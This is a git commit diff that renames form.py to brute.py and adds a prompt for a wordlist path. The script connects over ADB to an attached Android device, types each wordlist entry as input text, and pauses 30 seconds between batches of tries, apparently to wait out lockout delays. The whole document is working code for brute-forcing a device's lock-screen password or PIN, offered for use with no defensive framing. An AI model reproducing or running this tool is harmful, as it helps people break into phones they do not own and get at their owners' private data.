70eed9432789f4a1f137afd21689aa44de089f49
dark_7x <111196316+darkvirus-7x@users.noreply.github.com>
2023-05-03 19:24:56 +0100

    Update and rename form.py to brute.py

--- brute.py
+++ brute.py
@@ -1,8 +1,9 @@
 from time import sleep
 from ppadb.client import Client as AdbClient
-f = open('wordlist.txt','r+')
-li = f.readlines()
-def connect():
+import os
+import sys
+file = input('enter path of your wordlist: ')
+def connect(l):
     client = AdbClient(host="127.0.0.1", port=5037) # Default is "127.0.0.1" and 5037
     devices = client.devices()
 
@@ -13,7 +14,7 @@ def connect():
     device = devices[0]
     print(f'Connected to {device}')
     x = 0
-    for i in li:
+    for i in l:
         if x <= 5:
             x += 1
             device.shell('input text {}'.format(i))
@@ -28,4 +29,10 @@ def connect():
             x += 1
             device.shell('input text {}'.format(i))
             sleep(30)
-connect()
+if os.path.exists(file) == True:
+    f = open(file,'r+')
+    li = f.readlines()
+    connect(li)
+else:
+    print('the wordlist is not existing')
+    sys.exit(0)
